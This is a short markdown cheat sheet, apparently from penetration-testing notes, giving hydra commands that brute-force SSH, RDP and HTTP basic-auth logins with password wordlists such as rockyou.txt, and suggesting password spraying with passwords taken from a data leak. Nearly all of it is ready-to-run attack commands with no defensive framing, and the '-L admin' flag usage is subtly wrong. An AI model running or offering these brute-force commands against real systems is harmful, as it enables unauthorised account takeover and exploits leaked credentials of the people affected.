## Hydra

A very good tool for password bruteforcing is hydra.

### SSH

The following attack uses the wordlist.txt file to bruteforce the admin user for SSH login.

```shell
hydra -L admin -P wordlist.txt <target-ip> ssh -t 4
```

If the password is know, It could be used the tecnnique **password spraying** where the passwords remain constant and the username is bruteforced. This is useful if we gain passwords from a dataleak.

### RDP

A RDP attack could be this

```shell
hydra -L Administrator -P wordlist.txt <target-ip> rdp -t 4
```

### HTTP Basic Auth

This works with HTTP basic auth protocol

```shell
hydra -l admin -P rockyou.txt <target-ip> http-get
```